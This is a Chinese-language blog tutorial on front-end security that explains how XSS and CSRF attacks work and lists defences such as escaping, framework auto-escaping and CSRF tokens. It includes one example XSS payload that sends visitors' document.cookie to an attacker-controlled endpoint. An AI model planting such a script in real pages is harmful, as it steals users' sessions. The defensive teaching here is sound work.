---
title: 前端安全：XSS与CSRF
date: 2017-11-27 09:32:10
tags: 技术博客
---
## XSS的原理和防范方式
XSS全称Cross Site Scripting（为啥不叫CSS？为了和层叠样式表Cascading Style Sheets区分），即跨站脚本攻击。
定义 恶意用户 是实行XSS攻击的人，恶意代码 是指含有某些可执行恶意前端脚本的代码，目标用户 是指受到XSS攻击的人。
恶意用户将恶意脚本装作普通文本的样式上传到服务器，这些文本将被渲染到目标用户的页面上，从而被执行，这样的流程称之为‘跨站脚本攻击’。
举例：有一个发表评论的功能，一个人发表了评论大家就都能看见，于是恶意用户就在这个评论区发表了以下代码：
{% codeblock lang:JavaScript %}
var request = new XMLHttpRequest();
request.open('POST', '/攻击者自家的收集数据的接口', true);
request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
request.send(document.cookie);
{% endcodeblock %}
如果这个代码未经过滤直接执行，那么攻击者将会收集所有访问这个评论区的用户的cookie以便执行只有目标用户才有权限做的事情。
作为网站建设方，我们通常可以采取以下手段来防止XSS攻击：
1. 转义 &lt; &gt; 这些特殊字符为实体字符
2. 利用正则判断攻击脚本
3. 尽量修改节点文本而不是修改节点内容html

事实上，现代模板引擎和MVVM框架往往都自带防御XSS攻击的模板写法。
例如在ng2、Vue和handlebars.js里，双花括号表示自动过滤，三花括号才表示不经转义直接输出。

## CSRF的原理和防范方式
CSRF全称Cross-site request forgery（跨站请求伪造）是指恶意用户将某些需要他人权限的接口埋藏在自己的脚本中，将脚本利用XSS相同的注入方式或诱导用户点击执行等方式令拥有权限者执行，从而达到自己的目的。
例如，恶意用户想要给某个人刷票，而一个微信号只能投一张票，他发现了刷票的接口为A，则将对A进行Ajax请求的XSS脚本注入某网站（方法1）,或者利用像色情等吸引眼球的方法（方法2）将此段脚本内嵌入自己写的网页中诱使他人点击，从而实现不断有有效用户访问这个接口的目的。
作为网站建设方，我们通常可以使用以下手段来防止CSRF攻击：
1. 尽量对要修改数据的请求使用post而不是get
2. 给每一次用户登陆分配一个临时token，用服务端的setCookie头将此token种入用户cookie中，每次请求比对用户方token与服务器端token是否吻合。
3. 服务器禁止跨域请求
4. 及时清除用户的无效cookie
